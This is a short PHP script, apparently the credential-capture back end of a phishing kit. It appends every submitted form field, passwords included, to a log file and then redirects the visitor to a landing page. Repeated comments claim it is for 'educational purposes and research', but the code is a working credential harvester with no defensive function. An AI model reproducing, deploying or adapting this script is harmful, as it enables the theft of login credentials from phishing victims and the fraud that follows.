<?php
//the app is for educational purposes ans reseach, thank you//
header ('Location: land.html');
//the app is for educational purposes //
$handle = fopen("log.txt", "a");
//stop asking d ple for ps//
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
//the apps is for educational purposes any reseach, thank you la//
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>